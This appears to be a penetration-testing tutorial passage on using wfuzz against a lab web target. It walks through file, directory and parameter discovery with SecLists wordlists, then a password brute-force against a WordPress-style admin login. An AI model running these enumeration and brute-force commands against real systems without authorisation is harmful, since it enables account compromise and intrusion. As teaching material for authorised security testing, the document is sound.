
wfuzz --help

```console
export URL="http://target:80/FUZZ"
echo $URL
```

our environment variable exported, let's start fuzzing some files in the web root. We'll run wfuzz with -c to display color output, -z file to specify the input source, and --hc to avoid non-existent and erroneous responses.

```console
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 301,404,403 "$URL"
```

To find directories using Wfuzz, let's re-export our environment variable with a trailing forward slash. We'll also update the list we're using in our Wfuzz command from raft-medium-files.txt to raft-medium-directories.txt.

```console
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404,403,301 "$URL"
```

Further, we want to make sure when performing parameter discovery that we utilize the best wordlist we can. For this purpose, we have chosen a wordlist titled burp-parameter-names.txt, which contains approximately 2,588 possible parameter names.

```console
export URL="http://target:80/index.php?FUZZ=data"
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404,301 "$URL"
```

We will use the /usr/share/seclists/Usernames/cirt-default-usernames.txt wordlist for our purposes here. In our Kali Linux VM, let's point Wfuzz at the http://target:80/index.php?fpv=FUZZ endpoint.

```console
wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404 http://offsecwp:80/index.php?fpv=FUZZ
```

We quickly notice that there are a lot of erroneous responses with our parameter values (specifically the 301 response code). To exclude these erroneous responses from our Wfuzz output, we will also add the --hc option with a value of a 301.

```console
wfuzz -c -z file,/usr/share/seclists/Usernames/cirt-default-usernames.txt --hc 404,301 http://offsecwp:80/index.php?fpv=FUZZ
```

To begin targeting for our brute force attack, we'll provide the -d parameter to specifically fuzz the POST data of the endpoint provided in the below listing. We will also need to supply a value such as pwd=FUZZ for this to work properly. Lastly, we will make use of the --hc parameter with a value of 404 to avoid erroneous responses. In this case, a 404 message indicates a "not found" response.

```
wfuzz -c -z file,/usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt --hc 200,404 -d "log=admin&pwd=FUZZ" --hh 7201 "$URL"
```
